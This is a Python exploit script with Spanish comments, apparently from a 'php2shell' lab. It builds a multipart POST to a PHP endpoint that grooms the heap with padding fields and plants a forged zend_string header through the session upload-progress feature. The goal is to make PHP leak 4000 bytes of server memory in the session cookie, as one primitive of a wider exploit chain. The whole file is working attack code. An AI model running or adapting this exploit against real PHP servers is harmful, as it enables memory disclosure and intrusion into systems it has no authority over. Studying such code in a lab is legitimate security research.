#!/usr/bin/env python3
"""
b_forge.py — variante propia del payload B para el laboratorio de php2shell.

Objetivo: con `display_errors=Off` y el primitivo A ya estable, hacer que el
`PS(id)` heredado apunte a un `zend_string` cuyo `len` sea 4000, para que
`php_session_send_cookie()` filtre 4000 bytes en la cookie.

Diferencias con `send_b_open.py` de 9bie: el header forjado se coloca a una
distancia D configurable del inicio del valor, independiente de la longitud
total. Eso permite alinear el header con el `PS(id)` real, que en este build
cae en la pagina 510 del chunk cacheado (no en la 511).

Uso:
    python3 b_forge.py --url http://127.0.0.1:18191/index.php \
        --n 40 --bb1 1048551 --d 1036288 --read 4000 --out /tmp/b_forge.resp

Parámetros:
    --n      campos de 231 B (resuelven ps_close_files)
    --bb1    longitud del campo 'P' que empaqueta el chunk (255/256 paginas)
    --d      offset del header forjado dentro del valor BF
    --read   len que se escribe en el header (4000)
"""

import argparse
import struct
import sys
import urllib.parse


def build_multipart(n, bb1_len, d, read_len, fill_len):
    bnd = b'B' * 10
    parts = []

    for i in range(n):
        parts.append((str(1000 + i).encode(), b'V' * 231))

    if bb1_len > 0:
        parts.append((b'900001', b'P' * bb1_len))

    # Valor BF: relleno Q hasta D, header forjado en D-24..D-8, luego M.
    if fill_len <= d:
        raise SystemExit("fill_len debe ser mayor que d")
    buf = bytearray(b'Q' * fill_len)
    struct.pack_into('<Q', buf, d - 24, 0x4141414141414141)  # gc
    struct.pack_into('<Q', buf, d - 16, 0)                   # h
    struct.pack_into('<Q', buf, d - 8, read_len)             # len
    buf[d:] = b'M' * (fill_len - d)
    parts.append((b'900002', bytes(buf)))

    parts.append((b'PHPSESSID', b'attacksessionid0001'))
    parts.append((b'PHP_SESSION_UPLOAD_PROGRESS', b'pwn'))

    body = bytearray()
    for name, data in parts:
        body += b'--' + bnd + b'\r\n'
        body += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        body += data + b'\r\n'
    body += b'--' + bnd + b'--\r\n'
    return bytes(body), bnd


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--n", type=int, default=40)
    ap.add_argument("--bb1", type=int, default=1048551)
    ap.add_argument("--d", type=int, default=1036288,
                    help="253*4096: header en la pagina 510 si el valor empieza en 257")
    ap.add_argument("--read", type=int, default=4000)
    ap.add_argument("--fill", type=int, default=1040384,
                    help="longitud del valor BF; 1040384 -> 255 paginas con el header en 253*4096")
    ap.add_argument("--out", default="/tmp/b_forge.resp")
    args = ap.parse_args()

    body, bnd = build_multipart(args.n, args.bb1, args.d, args.read, args.fill)
    path = urllib.parse.urlparse(args.url).path or "/index.php"
    host = urllib.parse.urlparse(args.url).netloc

    import socket
    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n" % (path, host, bnd.decode(), len(body))
    ).encode() + body

    s = socket.create_connection(
        (urllib.parse.urlparse(args.url).hostname,
         urllib.parse.urlparse(args.url).port or 80), timeout=60)
    s.settimeout(60)
    resp = bytearray()
    try:
        s.sendall(req)
        while len(resp) < 2_000_000:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    except OSError:
        pass
    s.close()
    open(args.out, 'wb').write(bytes(resp))
    print("RESP_LEN", len(resp))


if __name__ == "__main__":
    main()
